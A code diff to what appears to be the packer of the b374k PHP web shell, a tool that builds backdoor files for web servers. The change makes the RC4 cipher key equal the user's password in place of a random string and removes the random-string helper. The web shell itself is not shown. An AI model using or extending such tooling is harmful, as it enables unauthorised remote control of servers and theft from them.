@@ -17,7 +17,7 @@ $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
 $GLOBALS['packer']['module'] = packer_get_module();
 $GLOBALS['packer']['theme'] = packer_get_theme();
-$GLOBALS['cipher_key'] = generateRandomString(32);
+$GLOBALS['cipher_key'] = "";
 
 require $GLOBALS['packer']['base_dir'].'jsPacker.php';
 
@@ -316,6 +316,7 @@ else{
 		}
 
 		$password = isset($opt['p'])? trim($opt['p']):"";
+		$GLOBALS['cipher_key'] = $password;
 		$theme = isset($opt['t'])? trim($opt['t']):"default";
 		if(!in_array($theme, $GLOBALS['packer']['theme'])){
 			$output .= "error : unknown theme file\n\n";
@@ -607,16 +608,6 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 		return "Succeeded : <a href='".$output."' target='_blank'>[ ".$output." ] Filesize : ".filesize($output)."</a>{[|b374k|]}".packer_html_safe(trim($code));
 	}
 	return "error{[|b374k|]}";
-}
-
-function generateRandomString($length = 10) {
-    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
-    $charactersLength = strlen($characters);
-    $randomString = '';
-    for ($i = 0; $i < $length; $i++) {
-        $randomString .= $characters[rand(0, $charactersLength - 1)];
-    }
-    return $randomString;
 }
 
 function rc4($key, $str) {
